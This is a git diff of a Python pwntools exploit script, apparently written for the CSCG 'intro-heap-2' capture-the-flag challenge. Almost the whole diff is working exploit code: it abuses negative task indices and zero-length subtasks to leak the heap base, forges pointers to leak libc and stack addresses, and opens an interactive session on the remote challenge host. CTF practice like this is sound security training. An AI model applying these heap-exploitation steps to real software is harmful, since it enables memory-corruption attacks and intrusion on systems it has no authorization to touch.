@@ -9,8 +9,8 @@ context.terminal="/bin/kitty"
 target=ELF("./main")
 libc=ELF("target_libc.so.6")
 CN=None
-CN = remote("172.17.0.2", 1024)
-#CN = remote("e71c7dd47499e4d37a1a0a8b-intro-heap-2.challenge.master.cscg.live", 31337, ssl=True)
+#CN = remote("172.17.0.2", 1024)
+CN = remote("73ac3c99646d9ad447d74dcc-intro-heap-2.challenge.master.cscg.live", 31337, ssl=True)
 p=target.process()
 if isinstance(p, process) and CN is None:
     print("isproces")
@@ -57,7 +57,8 @@ def createSubTask(content, mainTaskId:int, length=None):
         contentmsg=None
         print("Wrong content type")
     if contentmsg is not None:
-        CN.send(contentmsg+b"\n")
+        if length!=0:
+            CN.send(contentmsg+b"\n")
     CN.recvuntil(PROMPT)
 
 
@@ -68,7 +69,7 @@ def deleteSubTask(mainTaskId:int, subTaskId:int):
     CN.send(str(subTaskId).encode('ascii')+b"\n")
     CN.recvuntil(PROMPT)
 
-def listSubTask(mainTaskId:int):
+def listSubTask(mainTaskId:int)->dict[int, bytes]:
     CN.send(b"6\n")
     CN.send(str(mainTaskId).encode('ascii')+b"\n")
     response = CN.recvuntil(PROMPT)
@@ -86,15 +87,48 @@ def main():
     
     #g=gdb.attach(p)
     CN.recvuntil(PROMPT)
-    createTask("A"*15)
-    charset=string.ascii_uppercase
-    for i in range(13):
-        createSubTask(charset[i]*0x99,0)
-    deleteSubTask(0,8)
-    deleteSubTask(0,10)
-    deleteSubTask(0,12)
-    createTask("B"*15)
-    createSubTask("1"*15,1)
+    charset=string.ascii_lowercase
+
+    for i in range(6):
+        createSubTask(charset[i]*3,-11)#,0x99)
+        #createSubTask(charset[i]*15,0,0x99)
+    createSubTask("",-11,255)
+    createSubTask("",-11,0)
+    createSubTask("",0,0)
+    createSubTask("",0,0)
+    createSubTask("",0,0)
+    createSubTask("",0,0)
+    createSubTask("",1,0)
+    createSubTask("",1,0)
+    createSubTask("",1,0)
+    createSubTask("",1,0)
+    r=listSubTask(0)
+    heapBaseAddress=int(r[0][::-1].hex(),16)-0x550
+    print(hex(heapBaseAddress))
+    for i in range(10):
+        createSubTask(str(i)*0x90,0)
+    for i in range(8):
+        deleteSubTask(0,i+4)
+    createSubTask(b"\x00"*8+(heapBaseAddress+0xa60).to_bytes(8,'little')+b"\x00"*8*23,-11,255)
+    r=listSubTask(2)
+    libcBaseAddress=int(r[0][::-1].hex(),16)-0x219D80
+    print(hex(libcBaseAddress))
+    createSubTask(b"\x00"*8+(libcBaseAddress+0x2211f9).to_bytes(8,'little')+b"\x00"*8*23,-11,255)
+    r=listSubTask(3)
+    stackAddress=int(r[0][::-1].hex(),16)
+    print(hex(stackAddress))
+    stackAddress=int(input("please enter the begin of environment stack pages"))
+    createSubTask(b"\x00"*8+(stackAddress+0xfe3-0x24).to_bytes(8,'little')+b"\x00"*8*23,-11,255)
+    r=listSubTask(4)
+    print(r)
+    CN.interactive()
+    #rint(CN.recvuntil(PROMPT))
+    #deleteSubTask(2,0)
+    #deleteSubTask(2,1)
+    #deleteSubTask(2,3)
+    #    deleteTask(1)
+    #createTask("B"*15)
+    #createSubTask("1"*15,1)
     #heapaddr=bytes.fromhex(input("Enter heap addr: "))
     #reversedHeap=heapaddr[::-1]
     #createSubTask(reversedHeap,0)
@@ -102,11 +136,10 @@ def main():
     #deleteSubTask(0,2)
     #deleteSubTask(0,4)
     #deleteSubTask(0,6)
-    CN.interactive()
-    for i in range(24):
-        deleteSubTask(0,24-i)
     for i in range(44):
         createTask("A"*15)
+    for i in range(24):
+        deleteSubTask(0,24-i)
     
     createSubTask(str(0)[0]*15,0)
     
